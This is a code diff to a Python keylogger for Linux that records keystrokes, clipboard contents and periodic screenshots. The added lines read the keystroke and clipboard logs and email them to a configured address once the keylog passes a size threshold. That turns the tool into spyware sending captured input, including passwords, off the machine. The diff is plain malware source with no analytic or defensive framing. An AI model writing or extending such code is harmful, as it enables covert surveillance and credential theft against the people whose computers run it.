@@ -11,6 +11,7 @@ import threading
 import pyscreenshot as ImageGrab
 
 from Clipboard.linux import getClipboardData
+from mail import *
 
 from Pyxhook import pyxhook
 
@@ -54,7 +55,7 @@ class Logging:
 	
 	def SaveLog(self):
 		fob = open(self.path, 'a')
-		fob.write('- '+self.data)
+		fob.write(''+self.data)
 		fob.write('\n')
 		fob.close()
 	def CloseLog(self):
@@ -68,12 +69,37 @@ def ScreenShot():
 	img.save(SCREENSHOT_PATH + FILENAME + '.jpg', 'JPEG')
 
 
+def FileToString(path):
+	# file = open('data.txt', 'r')
+	# text = file.read().strip()
+	# file.close()
+	with open(path, 'r') as myfile:
+		data=myfile.read().replace('\n', '')
+	return data
+
+
 inter = setInterval(SCREENSHOT_TIMER, ScreenShot)
 
+
+def sendTxtEmail():
+	message = "KEYLOG : \n "+FileToString(keylog) + "\n\n\n CLIPLOG : \n" + FileToString(cliplog)
+	sendmail(EMAIL_FROM, PASSWORD, EMAIL_TO, SUBJECT, message)
+
+
+keylog_size = KEYLOG_SIZE
+cliplog_size = CLIPLOG_SIZE
 
 def OnKeyPress(event):
   	logging_key = Logging(keylog, event.Key)
   	logging_key.SaveLog()
+	sizefile_key = os.path.getsize(keylog)
+	# sizefile_clip = os.path.getsize(cliplog)
+	# print(sizefile_key)
+	global keylog_size
+	global cliplog_size
+	if int(sizefile_key) > keylog_size:
+		sendTxtEmail()
+		keylog_size = keylog_size*10
 
   	if event.Key=='[5053]':
   	  	logging_key.CloseLog()
@@ -83,7 +109,7 @@ def OnKeyPress(event):
 
 def OnKeyUnPress(event):
 	if event.Key == 'Control_L':  # or event.Key == 'C'
-		clip = getClipboardData()
+		clip = "- "+getClipboardData()
 		logging_clip = Logging(cliplog, clip)
 		logging_clip.SaveLog()
 
